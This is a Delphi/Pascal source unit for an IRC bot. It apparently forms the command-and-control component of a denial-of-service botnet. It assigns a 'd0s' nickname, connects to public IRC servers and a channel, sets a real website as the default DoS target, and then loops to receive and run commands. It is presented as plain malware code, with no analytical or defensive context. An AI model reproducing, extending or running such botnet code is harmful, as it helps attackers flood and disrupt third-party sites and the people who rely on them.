   unit irc;

   interface

   uses windows,winsock, main,settings;

   procedure ircbot;

   implementation

   procedure ircbot;
   begin
   randomize;
     if ircnick = '' then ircnick := 'd0s'+inttostr(random(99999));
     if ircserv = '' then ircserv := 'uk.undernet.org';
     if ircserv2 = '' then ircserv2 := 'irc.elfnet.org';
     if ircprefix = '' then ircprefix := '.';
     if ircchan = '' then ircchan := '#TC0';
     retry := 0;
     if ircdos = '' then ircdos := 'http://www.lunarstorm.se';
     sleep(500);
    StartUp;  //Starts bot
    SendInfo; //Sends Info
   while True do
    begin
     if (recv(Sock1,buff,SizeOf(buff),0)) < 1 then  // Trys to read from socket if
      begin                                         // the Recv() comes out to be
       if retry = 1 then retry := 0 else retry := 1;
       Restart;                                     // then it will restart. If not
      end else                                      // then does the ReadSock procedure.
       begin
        ReadSock;
       end;
     end;
   end;

   end.
